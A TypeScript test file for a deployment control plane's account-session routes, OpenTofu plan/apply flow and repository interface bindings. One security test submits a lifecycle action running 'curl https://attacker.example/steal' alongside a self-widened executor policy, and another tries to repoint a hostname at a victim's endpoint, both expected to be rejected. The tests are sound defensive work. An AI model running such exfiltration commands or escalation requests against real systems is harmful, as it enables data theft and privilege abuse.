import { expect, test } from "bun:test";

import { ACCOUNT_SESSION_COOKIE_NAME } from "../../../../accounts/service/src/account-session.ts";
import {
  handleControlRoute,
  type ControlPlaneOperations,
} from "../../../../accounts/service/src/control-routes.ts";
import { InMemoryAccountsStore } from "../../../../accounts/service/src/store.ts";
import { createTakosumiService } from "../../../../core/bootstrap.ts";
import type { RepositoryManifestDocument } from "takosumi-contract/repository-manifest";
import type {
  OpenTofuApplyJob,
  OpenTofuDestroyJob,
  OpenTofuPlanJob,
  OpenTofuPlanResult,
  OpenTofuRunner,
  OpenTofuStableSourceTagResolutionJob,
  OpenTofuSourceSnapshotPresentationFileJob,
} from "../../../../core/domains/deploy-control/mod.ts";
import { InMemoryOpenTofuControlStore } from "../../../../core/domains/deploy-control/store.ts";
import { ObjectKeyArtifactReferenceAllocator } from "../../../../core/adapters/storage/artifact-references.ts";
import {
  fakeProviderVault,
  FIXTURE_ARCHIVE_DIGEST,
  FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE,
  FIXTURE_CLOUDFLARE_PROVIDER,
  seedCapsuleModel,
  seedProviderConnections,
} from "../../../helpers/deploy-control/model_fixture.ts";

const ORIGIN = "https://app.takosumi.test";
const PLAN_DIGEST =
  "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
const LOCK_DIGEST =
  "sha256:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
const STATE_DIGEST =
  "sha256:fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210";

const REPOSITORY_INTERFACE_MANIFEST = {
  apiVersion: "takosumi.com/v2",
  kind: "Repository",
  install: {
    modules: {
      ".": {
        inputs: [],
        interfaces: [
          {
            key: "launcher",
            name: "app.launcher",
            spec: {
              type: "interface.ui.surface",
              version: "1",
              document: {
                display: { title: "Open app" },
                launcher: true,
              },
              inputs: {
                url: {
                  source: "output",
                  outputName: "launch_url",
                  outputType: "url",
                },
              },
              access: {
                visibility: "workspace",
                resourceUriInput: "url",
              },
            },
            bindingRequests: [
              {
                key: "installer",
                subject: { source: "installing_principal" },
                permissions: ["ui.open"],
                delivery: { type: "none" },
              },
            ],
          },
          {
            key: "unbound-status",
            name: "app.unbound-status",
            spec: {
              type: "example.status",
              version: "1",
              document: { purpose: "binding-negative-control" },
              inputs: {
                state: { source: "literal", value: "available" },
              },
              access: { visibility: "workspace" },
            },
          },
        ],
      },
    },
  },
} satisfies RepositoryManifestDocument;

interface RecordingRunner extends OpenTofuRunner {
  readonly planJobs: OpenTofuPlanJob[];
  readonly applyJobs: OpenTofuApplyJob[];
  readonly destroyJobs: OpenTofuDestroyJob[];
  readonly stableTagJobs: OpenTofuStableSourceTagResolutionJob[];
  readonly presentationFileJobs: OpenTofuSourceSnapshotPresentationFileJob[];
}

function recordingRunner(
  planResult: Partial<OpenTofuPlanResult> = {},
): RecordingRunner {
  const planJobs: OpenTofuPlanJob[] = [];
  const applyJobs: OpenTofuApplyJob[] = [];
  const destroyJobs: OpenTofuDestroyJob[] = [];
  const stableTagJobs: OpenTofuStableSourceTagResolutionJob[] = [];
  const presentationFileJobs: OpenTofuSourceSnapshotPresentationFileJob[] = [];
  return {
    planJobs,
    applyJobs,
    destroyJobs,
    stableTagJobs,
    presentationFileJobs,
    plan: (job) => {
      planJobs.push(job);
      return Promise.resolve({
        planDigest: PLAN_DIGEST,
        planArtifact: {
          kind: "runner-local",
          ref: "runner-local://plan/tfplan",
          digest: PLAN_DIGEST,
          contentType: "application/vnd.opentofu.plan",
        },
        providerLockDigest: LOCK_DIGEST,
        requiredProviders: [FIXTURE_CLOUDFLARE_PROVIDER],
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
        planResourceChanges: [],
        ...planResult,
      });
    },
    apply: (job) => {
      applyJobs.push(job);
      return Promise.resolve({
        outputs: {
          launch_url: {
            sensitive: false,
            value: "https://hello.takosumi.test",
          },
          admin_token: { sensitive: true, value: "secret-output-token" },
        } as never,
        stateDigest: STATE_DIGEST,
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
      });
    },
    destroy: (job) => {
      destroyJobs.push(job);
      return Promise.resolve({
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
      });
    },
    readCapsuleSourceFiles: () =>
      Promise.resolve([
        {
          path: "main.tf",
          text: `
terraform {
  required_providers {
    cloudflare = {
      source = "cloudflare/cloudflare"
    }
  }
}

resource "cloudflare_workers_script" "app" {
  account_id  = "fixture-account"
  script_name = "fixture-app"
  content     = "export default { fetch() { return new Response('ok') } }"
}

output "launch_url" {
  value = "https://hello.takosumi.test"
}
`,
        },
      ]),
    resolveStableSourceTag: (job) => {
      stableTagJobs.push(job);
      return Promise.resolve({
        tag: "v2.4.0",
        commit: "1234567890abcdef1234567890abcdef12345678",
      });
    },
    readSourceSnapshotPresentationFile: (job) => {
      presentationFileJobs.push(job);
      return Promise.resolve({
        path: job.path,
        text: '{"kind":"CapsuleSourceOptions"}\n',
        digest:
          "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
        sizeBytes: 32,
      });
    },
  };
}

function seedSession(
  store: InMemoryAccountsStore,
  subject = "user_test",
): string {
  const now = Date.now();
  store.saveAccount({
    subject,
    email: "user_test@example.test",
    displayName: "Route E2E User",
    createdAt: now,
    updatedAt: now,
  });
  const sessionId = `sess_real_operations_e2e_${subject}`;
  store.saveAccountSession({
    sessionId,
    subject,
    createdAt: now,
    expiresAt: now + 60_000,
  });
  return `${ACCOUNT_SESSION_COOKIE_NAME}=${sessionId}`;
}

function request(
  method: string,
  path: string,
  init: { readonly cookie?: string; readonly body?: unknown } = {},
): { readonly request: Request; readonly url: URL } {
  const url = new URL(`${ORIGIN}${path}`);
  const headers: Record<string, string> = {};
  if (init.cookie) headers.cookie = init.cookie;
  if (init.body !== undefined) headers["content-type"] = "application/json";
  return {
    request: new Request(url, {
      method,
      headers,
      ...(init.body !== undefined ? { body: JSON.stringify(init.body) } : {}),
    }),
    url,
  };
}

async function controlJson<T>(
  input: {
    readonly operations: ControlPlaneOperations;
    readonly store: InMemoryAccountsStore;
    readonly cookie: string;
    readonly method: string;
    readonly path: string;
    readonly body?: unknown;
  },
  expectedStatus: number,
): Promise<T> {
  const built = request(input.method, input.path, {
    cookie: input.cookie,
    ...(input.body !== undefined ? { body: input.body } : {}),
  });
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: input.store,
    operations: input.operations,
  });
  expect(response).toBeDefined();
  if (response!.status !== expectedStatus) {
    const failureText = await response!.clone().text();
    throw new Error(
      `${input.method} ${input.path} expected ${expectedStatus}, got ${response!.status}: ${failureText}`,
    );
  }
  expect(response!.headers.get("server-timing")).toContain("tk_control_auth");
  expect(response!.headers.get("server-timing")).toContain(
    "tk_control_dispatch",
  );
  return (await response!.json()) as T;
}

test("a Workspace session cannot grant itself operator lifecycle actions through the Capsule config patch", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_lifecycle_escalation",
    capsuleId: "cap_lifecycle_esc",
    installConfigId: "icfg_lifecycle00001",
    installConfig: {
      workspaceId: "ws_lifecycle_escalation",
      internal: { reason: "per_install_overrides" },
      policy: {
        lifecycleActions: {
          allowedExecutors: ["runner"],
          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
        },
      },
    },
  });

  // PATCH /api/v1/capsule-configs/:id is gated only by active Workspace
  // membership, and an `operator` action is executed by the operator's own
  // release-activation webhook. Widening the policy in the same patch that
  // installs the action must not be self-authorizing.
  const built = request(
    "PATCH",
    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
    {
      cookie,
      body: {
        lifecycleActions: [
          {
            apiVersion: "takosumi.dev/v1alpha1",
            kind: "command",
            id: "activate",
            phase: "post_apply",
            executor: "operator",
            command: ["curl", "https://attacker.example/steal"],
            runnerCapability: "capsule.lifecycle.command.v1",
          },
        ],
        lifecycleActionPolicy: {
          allowedExecutors: ["runner", "operator"],
          allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
        },
      },
    },
  );
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: accountStore,
    operations,
  });

  expect(response?.status).toEqual(403);
  const stored = await operations.capsules.getInstallConfig(
    seeded.installConfig.id,
  );
  expect(stored.lifecycleActions).toBeUndefined();
  expect(stored.policy.lifecycleActions?.allowedExecutors).toEqual(["runner"]);
});

test("a Capsule config patch cannot drop the public_endpoint projection that reserves the hostname", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_public_endpoint",
    capsuleId: "cap_public_endpoint",
    installConfigId: "icfg_publicendpoint",
    installConfig: {
      workspaceId: "ws_public_endpoint",
      internal: { reason: "per_install_overrides" },
      variableMapping: { app_url: "https://mine.app.takosumi.test" },
      installExperience: {
        projections: [
          {
            kind: "public_endpoint",
            variables: { url: "app_url" },
          },
        ],
      },
    },
  });

  // Erasing the projection while keeping the endpoint variable would make the
  // plan skip host reservation entirely and let `app_url` name someone else's
  // host — `installExperienceValue({})` parses, so this must be rejected here.
  const built = request(
    "PATCH",
    `/api/v1/capsule-configs/${seeded.installConfig.id}`,
    {
      cookie,
      body: {
        installExperience: {},
        variableMapping: { app_url: "https://victim.app.takosumi.test" },
      },
    },
  );
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: accountStore,
    operations,
  });

  expect(response?.status).toEqual(400);
  const stored = await operations.capsules.getInstallConfig(
    seeded.installConfig.id,
  );
  expect(stored.installExperience?.projections).toEqual([
    { kind: "public_endpoint", variables: { url: "app_url" } },
  ]);
  expect(stored.variableMapping.app_url).toBe("https://mine.app.takosumi.test");
});

test("account session control routes execute plan and apply through the real OpenTofu controller", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    opentofuConnectionVault: fakeProviderVault() as never,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });

  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_route_e2e",
    capsuleId: "cap_route_e2e",
    environment: "preview",
  });
  await seedProviderConnections(deployStore, seeded.capsule);
  const installUxDigest = `sha256:${"d".repeat(64)}`;
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: installUxDigest,
      document: {
        apiVersion: "takosumi.com/v1",
        kind: "Repository",
        install: { modules: { ".": { inputs: [] } } },
      },
    },
  });

  const sourceSnapshots = await controlJson<{
    readonly snapshots: readonly {
      readonly repositoryManifest?: unknown;
    }[];
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots`,
    },
    200,
  );
  expect(sourceSnapshots.snapshots[0]?.repositoryManifest).toEqual({
    status: "present",
    digest: installUxDigest,
  });
  expect(JSON.stringify(sourceSnapshots)).not.toContain('"document"');

  const stableTag = await controlJson<{
    readonly tag: string;
    readonly commit: string;
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/source-ref-resolutions/stable-semver`,
      body: { url: "https://github.com/example/options.git" },
    },
    200,
  );
  expect(stableTag).toEqual({
    tag: "v2.4.0",
    commit: "1234567890abcdef1234567890abcdef12345678",
  });
  expect(runner.stableTagJobs).toHaveLength(1);

  const presentationFile = await controlJson<{
    readonly sourceSnapshotId: string;
    readonly path: string;
    readonly digest: string;
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots/${seeded.snapshot.id}/file?path=install%2Foptions.json`,
    },
    200,
  );
  expect(presentationFile).toMatchObject({
    sourceSnapshotId: seeded.snapshot.id,
    path: "install/options.json",
    digest:
      "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
  });
  expect(runner.presentationFileJobs).toHaveLength(1);

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/sources/${seeded.source.id}/snapshots/${seeded.snapshot.id}/file?path=.well-known%2Ftakosumi.json`,
    },
    400,
  );
  expect(runner.presentationFileJobs).toHaveLength(1);

  const installUxPreview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        modulePath: ".",
        installConfigId: seeded.installConfig.id,
        capsuleName: "route-preview",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(installUxPreview.repositoryInstallUx.status).toBe("accepted");
  const previewConfig = await operations.capsules.getInstallConfig(
    installUxPreview.repositoryInstallUx.installConfigId,
  );
  expect(previewConfig.installExperience?.repositoryInstallUx).toEqual({
    status: "accepted",
  });
  expect(previewConfig.internal).toMatchObject({
    reason: "per_install_overrides",
    sourceSnapshotId: seeded.snapshot.id,
    repositoryInstallUxDigest: installUxDigest,
  });
  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "PATCH",
      path: `/api/v1/capsule-configs/${previewConfig.id}`,
      body: {
        variableMapping: { unreviewed_value: "must-not-be-adopted" },
      },
    },
    409,
  );
  expect(
    (await operations.capsules.getInstallConfig(previewConfig.id))
      .variableMapping,
  ).not.toHaveProperty("unreviewed_value");

  const repeatedInstallUxPreview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        modulePath: ".",
        installConfigId: seeded.installConfig.id,
        capsuleName: "route-preview",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(repeatedInstallUxPreview.repositoryInstallUx.installConfigId).toBe(
    installUxPreview.repositoryInstallUx.installConfigId,
  );

  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "invalid",
      reason: "invalid_document",
      diagnostic: "bounded fixture diagnostic",
    },
  });
  const invalidInstallUxPreview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "invalid";
      readonly diagnosticCode: string;
      readonly message: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        modulePath: ".",
        installConfigId: seeded.installConfig.id,
        capsuleName: "route-preview",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(invalidInstallUxPreview.repositoryInstallUx).toMatchObject({
    status: "invalid",
    diagnosticCode: "repository_install_ux_document_invalid",
  });
  expect(JSON.stringify(invalidInstallUxPreview)).not.toContain(
    "bounded fixture diagnostic",
  );
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: installUxDigest,
      document: {
        apiVersion: "takosumi.com/v1",
        kind: "Repository",
        install: { modules: { ".": { inputs: [] } } },
      },
    },
  });

  const planBody = await controlJson<{
    readonly run: {
      readonly id: string;
      readonly status: string;
      readonly planDigest?: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/capsules/${seeded.capsule.id}/plan`,
    },
    201,
  );
  expect(planBody.run.status).toEqual("succeeded");
  expect(planBody.run.planDigest).toEqual(PLAN_DIGEST);
  expect(runner.planJobs).toHaveLength(1);
  expect(runner.planJobs[0]!.sourceArchive).toEqual({
    ref: "workspaces/ws_route_e2e/sources/src_fixture/snapshots/snap_fixture/source.tar.zst",
    digest: FIXTURE_ARCHIVE_DIGEST,
  });
  expect(runner.planJobs[0]!.stateScope).toMatchObject({
    workspaceId: "ws_route_e2e",
    environment: "preview",
    generation: 0,
    subject: { kind: "capsule", id: seeded.capsule.id },
  });

  const applyBody = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
    readonly capsule?: {
      readonly id: string;
      readonly status: string;
      readonly currentStateGeneration?: number;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/runs/${planBody.run.id}/apply`,
    },
    201,
  );
  expect(applyBody.run.status).toEqual("succeeded");
  expect(applyBody.capsule).toMatchObject({
    id: seeded.capsule.id,
    status: "active",
    currentStateGeneration: 1,
  });
  expect("stateVersion" in applyBody).toBe(false);
  expect(JSON.stringify(applyBody)).not.toContain("launch_url");
  expect(JSON.stringify(applyBody)).not.toContain("secret-output-token");
  expect(runner.applyJobs).toHaveLength(1);
  expect(runner.applyJobs[0]!.planRun.id).toEqual(planBody.run.id);
  expect(runner.applyJobs[0]!.stateScope).toMatchObject({
    workspaceId: "ws_route_e2e",
    environment: "preview",
    generation: 1,
    subject: { kind: "capsule", id: seeded.capsule.id },
  });

  const runBody = await controlJson<{
    readonly run: {
      readonly id: string;
      readonly capsuleId?: string;
      readonly status: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/runs/${applyBody.run.id}`,
    },
    200,
  );
  expect(runBody.run).toMatchObject({
    id: applyBody.run.id,
    capsuleId: seeded.capsule.id,
    status: "succeeded",
  });
});

test("authenticated repository Interface review persists exact proposals and apply materializes only requested bindings", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    opentofuConnectionVault: fakeProviderVault() as never,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_repo_interface_e2e",
    capsuleId: "cap_repo_interface_seed",
    installConfigId: "icfg_repo_interface_base",
    name: "seed",
    installConfig: {
      outputAllowlist: {},
      policy: {
        repositoryInstallUx: {
          allowedInterfacePermissions: ["ui.open"],
        },
      },
    },
  });
  const repositoryManifestDigest = `sha256:${"e".repeat(64)}`;
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest: repositoryManifestDigest,
      document: REPOSITORY_INTERFACE_MANIFEST,
    },
  });

  const unauthenticatedPreviewRequest = request(
    "POST",
    `/api/v1/sources/${seeded.source.id}/compatibility-check`,
    {
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        modulePath: ".",
        installConfigId: seeded.installConfig.id,
        capsuleName: "repo-interface",
        compileInstallUx: true,
      },
    },
  );
  const unauthenticatedPreview = await handleControlRoute({
    request: unauthenticatedPreviewRequest.request,
    url: unauthenticatedPreviewRequest.url,
    store: accountStore,
    operations,
  });
  expect(unauthenticatedPreview?.status).toBe(401);

  const preview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        modulePath: ".",
        installConfigId: seeded.installConfig.id,
        capsuleName: "repo-interface",
        compileInstallUx: true,
      },
    },
    201,
  );
  const previewConfig = await operations.capsules.getInstallConfig(
    preview.repositoryInstallUx.installConfigId,
  );
  expect(previewConfig.workspaceId).toBe(seeded.workspace.id);
  expect(previewConfig.outputAllowlist).toEqual({
    launch_url: { from: "launch_url", type: "url", required: true },
  });
  expect(previewConfig.interfaceBlueprints).toEqual([
    {
      key: "launcher",
      name: "app.launcher",
      spec: {
        type: "interface.ui.surface",
        version: "1",
        document: {
          display: { title: "Open app" },
          launcher: true,
        },
        inputs: {
          url: { source: "capsule_output", outputName: "launch_url" },
        },
        access: {
          visibility: "workspace",
          resourceUriInput: "url",
        },
      },
      bindings: [
        {
          key: "installer",
          subjectRef: { kind: "Principal", id: "user_test" },
          permissions: ["ui.open"],
          delivery: { type: "none" },
        },
      ],
    },
    {
      key: "unbound-status",
      name: "app.unbound-status",
      spec: {
        type: "example.status",
        version: "1",
        document: { purpose: "binding-negative-control" },
        inputs: {
          state: { source: "literal", value: "available" },
        },
        access: { visibility: "workspace" },
      },
    },
  ]);

  const otherCookie = seedSession(accountStore, "user_other");
  await operations.members.upsertMember({
    workspaceId: seeded.workspace.id,
    accountId: "user_other",
    roles: ["admin"],
    status: "active",
    actor: {
      actorAccountId: "user_test",
      roles: ["owner"],
      requestId: "req_repo_interface_other_member",
    },
  });
  const principalConflict = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie: otherCookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-other-installer",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
      },
    },
    400,
  );
  expect(principalConflict.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_interface_blueprint_conflict",
    },
  });
  expect(
    (await operations.capsules.listCapsules(seeded.workspace.id)).some(
      (entry) => entry.name === "repo-interface-other-installer",
    ),
  ).toBe(false);

  const created = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: previewConfig.id,
      },
    },
    201,
  );
  expect(created.capsule.installConfigId).not.toBe(previewConfig.id);
  const scopedConfig = await operations.capsules.getInstallConfig(
    created.capsule.installConfigId,
  );
  expect(scopedConfig.workspaceId).toBe(seeded.workspace.id);
  expect(scopedConfig.outputAllowlist).toEqual(previewConfig.outputAllowlist);
  expect(scopedConfig.interfaceBlueprints?.[0]?.bindings).toEqual([
    {
      key: "installer",
      subjectRef: { kind: "Principal", id: "user_test" },
      permissions: ["ui.open"],
      delivery: { type: "none" },
    },
  ]);
  expect(JSON.stringify(scopedConfig.interfaceBlueprints)).not.toContain(
    "credentialRef",
  );
  expect(JSON.stringify(scopedConfig.interfaceBlueprints)).not.toContain(
    '"options"',
  );

  const capsule = await operations.capsules.getCapsule(created.capsule.id);
  await seedProviderConnections(deployStore, capsule);
  const plan = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/capsules/${capsule.id}/plan`,
    },
    201,
  );
  expect(plan.run.status).toBe("succeeded");
  const apply = await controlJson<{
    readonly run: { readonly id: string; readonly status: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/runs/${plan.run.id}/apply`,
    },
    201,
  );
  expect(apply.run.status).toBe("succeeded");

  const interfaces = await operations.interfaces.list({
    workspaceId: seeded.workspace.id,
    ownerKind: "Capsule",
    ownerId: capsule.id,
  });
  expect(interfaces).toHaveLength(2);
  const launcher = interfaces.find(
    (entry) =>
      entry.metadata.materializedFrom?.source === "capsule_blueprint" &&
      entry.metadata.materializedFrom.key === "launcher",
  );
  expect(launcher).toMatchObject({
    metadata: {
      workspaceId: seeded.workspace.id,
      ownerRef: { kind: "Capsule", id: capsule.id },
    },
    spec: {
      type: "interface.ui.surface",
      inputs: {
        url: {
          source: "capsule_output",
          capsuleId: capsule.id,
          outputName: "launch_url",
        },
      },
    },
    status: {
      phase: "Resolved",
      resolvedInputs: { url: "https://hello.takosumi.test" },
    },
  });
  expect(
    await operations.interfaces.listBindings(launcher!.metadata.id),
  ).toEqual([
    expect.objectContaining({
      spec: {
        interfaceId: launcher!.metadata.id,
        subjectRef: { kind: "Principal", id: "user_test" },
        permissions: ["ui.open"],
        delivery: { type: "none" },
      },
      status: expect.objectContaining({ phase: "Ready" }),
    }),
  ]);
  const unbound = interfaces.find(
    (entry) =>
      entry.metadata.materializedFrom?.source === "capsule_blueprint" &&
      entry.metadata.materializedFrom.key === "unbound-status",
  );
  expect(unbound?.status).toMatchObject({
    phase: "Resolved",
    resolvedInputs: { state: "available" },
  });
  expect(
    await operations.interfaces.listBindings(unbound!.metadata.id),
  ).toEqual([]);

  await operations.capsules.putInstallConfig({
    ...seeded.installConfig,
    id: "icfg_repo_interface_conflict",
    interfaceBlueprints: [
      {
        ...previewConfig.interfaceBlueprints![0]!,
        spec: {
          ...previewConfig.interfaceBlueprints![0]!.spec,
          document: { launcher: false },
        },
      },
    ],
  });
  const conflict = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-interface-conflict",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: "icfg_repo_interface_conflict",
      },
    },
    400,
  );
  expect(conflict.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_interface_blueprint_conflict",
    },
  });
  expect(
    (await operations.capsules.listCapsules(seeded.workspace.id)).some(
      (entry) => entry.name === "repo-interface-conflict",
    ),
  ).toBe(false);
});
